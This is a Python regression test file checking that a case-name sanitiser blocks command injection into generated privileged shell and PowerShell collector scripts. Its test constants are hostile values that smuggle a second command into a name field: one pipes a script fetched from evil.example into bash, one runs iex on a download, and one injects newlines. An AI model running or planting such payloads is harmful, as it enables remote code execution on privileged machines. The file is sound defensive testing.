"""Regression tests: a hostile case name must not inject commands into the
generated root shell / Administrator PowerShell collector scripts.

The templates substitute the case name into double-quoted assignments AND
comment lines, so values like ``x"; curl evil|bash; #`` used to land as live
code in scripts explicitly meant to run privileged on evidence endpoints.

Follows the api/ colocated-test convention: no app boot, helpers called
directly (see test_collector.py).
"""

import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

import routers.collector as co  # noqa: E402


HOSTILE = 'x"; curl -s evil.example/p.sh | bash; #'
PS_HOSTILE = 'x" ; iex (iwr evil.example) ; "'
NEWLINE_HOSTILE = "innocent\nCASE_NAME=\npwned\n"


def test_quotes_and_shell_chars_neutralized():
    out = co._script_safe(HOSTILE)
    for ch in ('"', "`", "$", "\\"):
        assert ch not in out
    # Still a readable label, not an empty string.
    assert out.strip()


def test_powershell_payload_neutralized():
    out = co._script_safe(PS_HOSTILE)
    for ch in ('"', "`", "$"):
        assert ch not in out


def test_newlines_cannot_break_comment_lines():
    out = co._script_safe(NEWLINE_HOSTILE)
    assert "\n" not in out and "\r" not in out


def test_plain_names_survive():
    assert co._script_safe("ACME Q4 Phish (ext-2024)") == "ACME Q4 Phish (ext-2024)"


def test_templates_have_no_unsanitized_path():
    # Every TPLCASE_NAME substitution must draw from _script_safe output —
    # the two template-fill builders assign `cn = _script_safe(case_name)`.
    import inspect

    src = inspect.getsource(co)
    assert 'cn = case_name or ""' not in src
